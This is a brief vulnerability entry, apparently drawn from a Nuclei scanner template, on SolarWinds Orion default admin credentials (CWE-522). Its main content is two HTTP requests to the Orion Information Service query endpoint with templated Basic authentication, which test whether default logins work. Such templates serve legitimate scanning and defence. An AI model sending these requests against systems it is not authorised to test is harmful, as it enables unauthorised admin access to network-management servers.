# Vulnerability: SolarWinds Orion Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`solarwinds-default-login.yaml`)

## Description
SolarWinds Orion default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /SolarWinds/InformationService/v3/Json/Query?query=SELECT+Uri+FROM+Orion.Pollers+ORDER+BY+PollerID+WITH+ROWS+1+TO+3+WITH+TOTALROWS HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username)}}

GET /InformationService/v3/Json/Query?query=SELECT+Uri+FROM+Orion.Pollers+ORDER+BY+PollerID+WITH+ROWS+1+TO+3+WITH+TOTALROWS HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username)}}
```

